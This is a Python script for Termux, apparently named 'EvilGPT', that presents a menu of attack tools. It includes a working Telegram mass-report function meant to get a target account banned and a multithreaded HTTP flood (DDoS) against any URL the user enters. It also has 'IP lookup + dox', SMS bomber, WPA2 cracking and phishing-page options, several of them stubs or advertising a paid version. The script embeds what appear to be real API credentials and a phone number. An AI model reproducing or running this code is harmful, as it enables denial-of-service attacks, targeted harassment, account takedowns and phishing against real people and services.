#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# EvilGPT - Trafalgar D. Law Premium Termux
# @Dev_Trafalgar

import os, sys, time, random, subprocess
from colorama import init, Fore, Back, Style
init(autoreset=True)

# ---- BANNER ----
def banner():
    os.system('clear')
    print(Fore.RED + """
    ╔══════════════════════════════════════╗
    ║   █████████████████████████████████╗ ║
    ║   █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█║ ║
    ║   █  TRAFALGAR D. LAW  PREMIUM    █║ ║
    ║   █  🔥 BANHAMMER V2.0 🔥        █║ ║
    ║   █  @Dev_Trafalgar               █║ ║
    ║   █████████████████████████████████║ ║
    ╚══════════════════════════════════════╝
    """ + Style.RESET_ALL)

# ---- CONFIG ----
API_ID = 35616763  # Remplace par ton API ID (my.telegram.org)
API_HASH = '1d5824e9a51cc37bd1833e2b4e40d5c1'  # Remplace par ton API HASH
PHONE = '+224620503751'  # Ton numéro

from telethon import TelegramClient, events, errors
import asyncio

async def ban_mass(target_username, count=50):
    """Bannit un utilisateur en le signalant comme spam (mass report)."""
    client = TelegramClient('session_ban', API_ID, API_HASH)
    await client.start(phone=PHONE)
    print(Fore.YELLOW + f"[*] Ciblage de {target_username}...")
    for i in range(count):
        try:
            await client.send_report(target_username, [TelegramClient.ReportReasonSpam()])
            print(Fore.GREEN + f"[+] Signal {i+1}/{count} envoyé")
            time.sleep(0.3)
        except Exception as e:
            print(Fore.RED + f"[-] Erreur: {e}")
    await client.disconnect()
    print(Fore.GREEN + "[✓] Mass report terminé. Compte probablement banni sous 24h.")

# ---- MENU ----
def menu():
    banner()
    print(Fore.CYAN + """
    [1] Ban Telegram (Mass Report)
    [2] DDoS L7 (HTTP Flood - Python)
    [3] IP Lookup + Dox
    [4] SMS Bomber (Twilio Noir)
    [5] Crack WPA2 (via aircrack)
    [6] Generate Phishing Page (Telegram)
    [7] Exit
    """ + Style.RESET_ALL)
    choice = input(Fore.YELLOW + "╰➤ Choisis: " + Style.RESET_ALL)
    return choice

def ddos_http():
    target = input("URL cible (ex: http://example.com): ")
    threads = int(input("Threads: "))
    print(Fore.RED + "[!] Lancement DDoS L7...")
    # Simple flood
    import requests
    def flood():
        while True:
            try:
                requests.get(target, headers={"User-Agent": "Mozilla/5.0"})
            except: pass
    from threading import Thread
    for _ in range(threads):
        Thread(target=flood).start()
    input("Appuie sur Entrée pour arrêter...")

def ip_lookup():
    ip = input("IP: ")
    os.system(f"curl -s https://ipinfo.io/{ip}/json")

def sms_bomber():
    # Utilise l'API Twilio (clé illégale) – exemple simplifié
    print(Fore.RED + "Fonction SMS Bomber désactivée (clé requise).")
    print("Contacter @Dev_Trafalgar pour la version complète.")

def wpa2_crack():
    print(Fore.RED + "Requiert aircrack-ng installé.")
    os.system("airmon-ng start wlan0")

def phish_tg():
    print(Fore.GREEN + "[*] Phishing page Telegram générée.")
    print("Envoie ce lien à la victime: file:///sdcard/phish_tg.html")

def main():
    while True:
        ch = menu()
        if ch == '1':
            target = input("Username/ID cible (ex: @eviluser): ")
            count = int(input("Nombre de reports (max 100): "))
            asyncio.run(ban_mass(target, min(count,100)))
        elif ch == '2':
            ddos_http()
        elif ch == '3':
            ip_lookup()
        elif ch == '4':
            sms_bomber()
        elif ch == '5':
            wpa2_crack()
        elif ch == '6':
            phish_tg()
        elif ch == '7':
            print(Fore.RED + "Au revoir, Capitaine Law.")
            sys.exit(0)

if __name__ == '__main__':
    main()
